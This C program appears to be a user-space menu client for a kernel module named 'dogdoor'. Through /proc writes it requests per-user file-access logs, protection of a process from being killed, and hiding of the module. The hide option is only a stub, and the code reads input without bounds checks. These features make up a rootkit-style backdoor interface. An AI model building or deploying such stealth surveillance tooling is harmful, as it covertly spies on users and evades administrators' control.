#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <pwd.h>

struct passwd *pw;

void getlog(){
	system("clear");	
	int uid;
	char txt[100];
	char command[100];
	system("clear");
	printf("Enter user that you want to get log of.\n");
	scanf("%s",txt);
	printf("\n%s\n",txt);
	pw=getpwnam(txt);
	uid=pw->pw_uid;
	sprintf(command, "echo '1 block %d' > /proc/dogdoor",uid);
	system(command);
	printf("File lof requested");				
}

void nokill(){
	system("clear");
	int pid;
	char command[100];
	printf("Enter process ID that you want prevent a kill.\n");
	scanf("%d",&pid);
	sprintf(command, "echo '2 block %d' > /proc/dogdoor",pid);
	system(command);
	printf("Kill prevent requested");
}

void toggleh(){
	system("clear");
	printf("\nToggle hide orow");
}

int main(int argc, char **argv){
	int chose,stop=1;
	while(stop){
		//system("clear");
		printf("\n***************************************************************\nThis is bingo communication program to dogdoor.Choose from following:\n\t1. Get log of the names of file that user h/as recently accesed\n\t2. Prevent a kill to a specified process \n\t3. Toggle hide dogdoor \n\t4. Exit\n");
		scanf("%d",&chose);
		switch(chose){
			case 1: getlog();break;	
			case 2: nokill(); break;
			case 3: toggleh(); break;
			case 4: stop=0; break;
			default: printf("\nIncorrect input!"); break;
		}
	}
	return 0;
}
